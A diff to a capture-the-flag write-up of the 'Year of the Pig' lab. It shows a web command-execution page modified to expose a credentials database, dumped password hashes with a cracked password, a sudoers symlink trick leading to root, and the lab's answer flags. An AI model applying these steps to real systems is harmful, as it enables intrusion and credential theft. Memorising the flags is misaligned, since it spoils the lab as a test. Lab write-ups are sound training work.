@@ -306,3 +306,158 @@ marco@year-of-the-pig:/var/www/html/admin$ cat commands.php
 	$dbh->close();
 ?>
 
+<!DOCTYPE html>
+<html>
+	<p id="id" style="display:none">commands</p>
+	<?php require "includes.php";?>
+	<body class="include">
+		<h1 id="content-title">Commands</h1>
+		<h2>Use this page to execute arbitrary commands on the system</h2>
+		<form method=post style="display: inline;">
+			<input type=text name="command" class="input" placeholder="Command...">
+			<input style="display:none;" type=submit name="submit" value="Execute" class="input" id="submit">
+		</form>
+		<img alt="submit" src="/assets/img/arrow.png" class="submit-btn" onclick="javascript:document.querySelector('#submit').click()">
+		<?php
+//Totally useless script to catch hackers out, eh, Marco? You old rogue!
+if (isset($_POST["command"])){
+    echo "<pre>";
+    $cmd=$_POST["command"];
+    if (strlen($cmd) == 0){
+        echo "No command entered";
+    }
+    else if ($cmd == "whoami"){
+        echo "www-data";
+    }
+    else if ($cmd == "id"){
+        echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
+    }
+    else if ($cmd == "ifconfig"){
+        system("ifconfig");
+    }
+    else if (substr($cmd,0,5) == "echo "){
+        system($cmd);
+    }
+    else if ($cmd == "hostname"){
+        echo "year-of-the-pig";
+    }
+    else{
+        system($cmd);
+    }
+    echo "<pre>\n";
+}
+?>
+	</body>
+</html>
+
+http://10.10.168.36/admin/
+cat /var/www/admin.db
+
+SQLite format 3@  nn.�
+��0����r�7tablesessionssessionsCREATE TABLE sessions (
+sessID TEXT UNIQUE PRIMARY KEY,
+userID TEXT,
+expiryTime TEXT)/Cindexsqlite_autoindex_sessions_1sessionsp�?tableusersusersCREATE TABLE users (
+userID TEXT UNIQUE PRIMARY KEY,
+username TEXT UNIQUE,
+password TEXT))=indexsqlite_autoindex_users_2users)=indexsqlite_autoindex_users_1users
+i�i��k�JJMMf64ccfff6f64d57b121a85f9385cf256curtisa80bfe309ecaafcea1ea6cb3677971f2IMM58a2f366b1fd51e127a47da03afc9995marcoea22b622ba9b3c41b22785dcb40211ac
+����mm�J%$Mf64ccfff6f64d57b121a85f9385cf256#M	58a2f366b1fd51e127a47da03afc9995
+�������	
+curtis	marco
+�`NMM!c404f6ecb1eb7f8d997e830ae7458b1658a2f366b1fd51e127a47da03afc99951688084057NMM!b0d0a65ab91e3c88aab21a9ed530c51858a2f366b1fd51e127a47da03afc99951688084048NMM!484364e69546acf7a6736e7e172f69f558a2f366b1fd51e127a47da03afc99951688083596
+
+a80bfe309ecaafcea1ea6cb3677971f2
+
+|Donald1983$|
+
+or
+
+else if($cmd == "givemethepass"){
+	system("chmod a+r /var/www/admin.db")
+	echo "no problem";
+}
+
+marco@year-of-the-pig:/var/www/html/admin$ tail -n20 commands.php 
+        system("ifconfig");
+    }
+    else if (substr($cmd,0,5) == "echo "){
+        system($cmd);
+    }
+    else if ($cmd == "hostname"){
+        echo "year-of-the-pig";
+    }
+    else if($cmd == "givemethepass"){
+	system("chmod a+r /var/www/admin.db");
+	}else{
+        system($cmd);
+    }
+    echo "<pre>\n";
+}
+?>
+	</body>
+</html>
+
+marco@year-of-the-pig:/var/www$ sqlite3 admin.db
+SQLite version 3.22.0 
+Enter ".help" for usage hints.
+sqlite> .tables
+sessions  users 
+sqlite> select * from users;
+58a2f366b1fd51e127a47da03afc9995|marco|ea22b622ba9b3c41b22785dcb40211ac
+f64ccfff6f64d57b121a85f9385cf256|curtis|a80bfe309ecaafcea1ea6cb3677971f2
+sqlite> .exit
+
+marco@year-of-the-pig:/home/curtis$ su curtis
+Password: 
+curtis@year-of-the-pig:~$ cat flag2.txt 
+THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh}
+
+curtis@year-of-the-pig:/var/www$ sudo -l
+[sudo] password for curtis: 
+Matching Defaults entries for curtis on year-of-the-pig:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
+    XUSERFILESEARCHPATH"
+
+User curtis may run the following commands on year-of-the-pig:
+    (ALL : ALL) sudoedit /var/www/html/*/*/config.php
+
+curtis@year-of-the-pig:/var/www$ exit
+exit
+marco@year-of-the-pig:/var/www$ ln -s /etc/sudoers /var/www/html/assets/img/config.php
+
+marco@year-of-the-pig:/var/www$ su curtis
+Password: 
+curtis@year-of-the-pig:/var/www$ cd /var/www/html/assets/img
+curtis@year-of-the-pig:/var/www/html/assets/img$ ls -lah
+total 188K
+drwxrwxr-x 2 www-data web-developers 4.0K Jun 29 02:00 .
+drwxrwxr-x 4 www-data web-developers 4.0K Aug 20  2020 ..
+-rw-r--r-- 1 root     root            156 May 15  2020 arrow.png
+lrwxrwxrwx 1 marco    marco            12 Jun 29 02:00 config.php -> /etc/sudoers
+-rwxrwxr-x 1 www-data web-developers 105K Aug 17  2020 favicon.ico
+-rwxrwxr-x 1 www-data web-developers  66K Aug 16  2020 plane.png
+curtis@year-of-the-pig:/var/www/html/assets/img$ sudoedit /var/www/html/*/*/config.php
+
+curtis ALL=(ALL) ALL
+under the **User privilege specification** section.
+curtis@year-of-the-pig:/var/www/html/assets/img$ sudo su
+root@year-of-the-pig:/var/www/html/assets/img# cd /root
+root@year-of-the-pig:~# ls
+root.txt
+root@year-of-the-pig:~# cat root.txt 
+THM{MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0}
+```
+Flag 1
+Case matters. T-Minus 120s.
+Flag 2
+Root Flag
+
+## Flags / Answers
+- ***THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}***
+- ***THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh}***
+- ***THM{MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0}***
+
+## Notes / Lessons Learned
+[[Year of the Dog]]
+
